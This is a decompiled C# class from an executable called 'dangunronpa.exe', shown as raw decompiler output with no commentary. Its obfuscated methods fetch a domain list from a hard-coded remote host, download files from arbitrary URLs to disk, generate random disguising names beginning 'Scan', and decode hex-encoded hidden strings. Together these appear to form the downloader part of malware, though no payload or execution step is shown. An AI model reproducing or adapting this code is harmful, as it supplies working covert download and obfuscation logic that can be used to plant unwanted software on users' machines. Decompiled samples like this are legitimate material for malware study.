// Decompiled with JetBrains decompiler
// Type: vgf
// Assembly: dangunronpa, Version=1.2.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 3958FDFD-FC81-45EF-BFDA-37B7EDF3E7D7
// Assembly location: C:\Users\лёха\Desktop\dangunronpa.exe

using System;
using System.IO;
using System.Net;
using System.Threading;

public static class vgf
{
  public static void fefqeefqf(string DNG)
  {
    Directory.CreateDirectory(DNG);
  }

  public static string qrqwer()
  {
    HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://romansoft.e3w.biz/domen");
    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
    return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
  }

  public static void gwredngr(string papa, string u)
  {
    new WebClient().DownloadFile(new Uri(u), papa);
  }

  public static string cbxfgfbgwes()
  {
    string str1 = "wgrih4ее4iqhvchv5254325caolhgvwou4981894854156";
    string str2 = "Scan";
    int num = new Random().Next(4, 8);
    for (int index = 0; index < num; ++index)
    {
      str2 = str2 + (object) str1[new Random().Next(0, str1.Length)];
      Thread.Sleep(124);
    }
    return str2;
  }

  public static string tre(string vcvvbvbv)
  {
    string str = string.Empty;
    for (; vcvvbvbv.Length > 0; vcvvbvbv = vcvvbvbv.Substring(2, vcvvbvbv.Length - 2))
      str = str + Convert.ToChar(Convert.ToUInt32(vcvvbvbv.Substring(0, 2), 16)).ToString();
    return str;
  }
}
